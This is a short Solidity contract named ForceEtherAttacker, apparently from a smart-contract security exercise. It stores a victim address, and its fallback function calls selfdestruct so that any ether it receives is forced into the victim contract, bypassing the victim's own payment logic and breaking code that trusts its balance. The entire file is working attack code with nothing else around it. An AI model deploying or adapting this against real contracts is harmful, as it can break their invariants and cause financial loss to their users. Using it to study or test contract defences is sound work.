pragma solidity ^0.4.23;

contract ForceEtherAttacker {

    address victim;

    function ForceEtherAttacker(address _victim) public {
        victim = _victim;
    }

    function() public payable {
        selfdestruct(victim);
    }
}
